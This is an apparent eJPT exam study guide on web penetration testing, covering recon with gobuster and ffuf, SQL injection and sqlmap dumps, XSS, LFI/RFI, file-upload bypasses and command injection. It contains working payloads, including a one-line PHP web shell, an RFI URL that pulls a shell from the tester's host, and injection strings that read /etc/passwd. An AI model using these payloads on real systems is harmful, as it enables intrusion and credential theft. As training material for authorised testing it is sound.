# Web Application Penetration Testing

Web is ~30% of the eJPT. The exam web vulns are the classic, well-understood ones — you won't need exotic chains, but you do need to recognize and exploit the basics fast. Always start with recon, then test inputs methodically.

---

## Web recon

Before attacking, map the app.

```bash
whatweb http://<ip>                         # server, CMS, languages
# Directory / file brute-forcing
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
# Virtual hosts / subdomains (if a hostname is in scope)
ffuf -u http://<ip>/ -H "Host: FUZZ.<domain>" -w <wordlist>
```

Always check by hand:
- **`/robots.txt`** and **`/sitemap.xml`** — hidden paths the owner didn't want indexed.
- **Page source + comments** — creds, paths, API endpoints left in HTML/JS.
- **Login forms** — try default creds (`admin:admin`, `admin:password`) first.
- **Error messages** — stack traces and SQL errors reveal the backend.
- **URL parameters** — every `?id=`, `?page=`, `?file=` is an injection candidate.

Use **Burp Suite** (proxy → intercept/repeater) to inspect and replay requests — this is the core web tool.

---

## SQL Injection (SQLi)

The highest-value web vuln on the exam.

**Detect:** add `'` to a parameter and watch for an error or changed behavior.

```sql
'                       -- break the query
' OR '1'='1             -- classic auth bypass in login forms
' ORDER BY 3-- -        -- find column count
' UNION SELECT 1,2,3-- -- extract data via UNION
```

**Automate with sqlmap:**

```bash
sqlmap -u "http://<ip>/page.php?id=1" --batch
sqlmap -u "http://<ip>/page.php?id=1" --dbs          # list databases
sqlmap -u "http://<ip>/page.php?id=1" -D <db> --tables
sqlmap -u "http://<ip>/page.php?id=1" -D <db> -T users --dump
# For POST/login forms: capture the request in Burp, save to file, then:
sqlmap -r request.txt --batch
```

Goal: dump credentials, then reuse them (web login, SSH, etc.). Sometimes SQLi → file read or RCE (`--os-shell`).

---

## Cross-Site Scripting (XSS)

Injecting script that runs in another user's browser.

```html
<script>alert(1)</script>          <!-- reflected/stored test -->
<img src=x onerror=alert(1)>        <!-- when <script> is filtered -->
```

- **Reflected** — payload in the URL/parameter is echoed back.
- **Stored** — payload saved by the app (comment, profile) and served to others.
- Impact for the exam: proof of execution; can be used to steal cookies/session tokens.

---

## File Inclusion (LFI / RFI)

A parameter that loads a file (`?page=about.php`) without validation.

```bash
# LFI — read local files
http://<ip>/index.php?page=../../../../etc/passwd
http://<ip>/index.php?page=../../../../etc/passwd%00      # null byte (old PHP)

# Log poisoning → RCE: inject PHP into a log (e.g. User-Agent), then include the log
# RFI — include a remote shell (requires allow_url_include)
http://<ip>/index.php?page=http://<your-ip>/shell.txt
```

LFI to read `/etc/passwd`, SSH keys, or config files; escalate to RCE via log poisoning or `php://` wrappers.

---

## File Upload

An upload form that doesn't properly validate file type.

- Upload a web shell (e.g. a `.php` file) and browse to it for RCE.
- Bypass filters: double extensions (`shell.php.jpg`), case (`.pHp`), alternate extensions (`.phtml`, `.php5`), or fake the `Content-Type` in Burp.
- After upload, find where it lands (often `/uploads/`) and call it.

```php
<?php system($_GET['cmd']); ?>     // then: /uploads/shell.php?cmd=id
```

---

## Command Injection

An input passed into a system command.

```bash
; id
| whoami
`id`
$(whoami)
&& cat /etc/passwd
```

Confirm with a harmless command, then upgrade to a [reverse shell](../cheatsheets/README.md).

---

## Other inputs worth a quick test

- **IDOR / broken access control** — change an `id`/`user` parameter to access someone else's data.
- **Directory traversal** — `../` in any file/path parameter to escape the web root.
- **Default/exposed admin panels** — phpMyAdmin, Tomcat Manager, WordPress `/wp-admin` (use `wpscan`).

---

## Web workflow summary

1. Fingerprint the stack (`whatweb`), brute-force directories.
2. Check `robots.txt`, source, comments, and every login.
3. Test each parameter for SQLi, LFI, command injection; test uploads and forms.
4. Turn a finding into creds or a shell, then pivot back to the [methodology loop](../methodology/README.md).
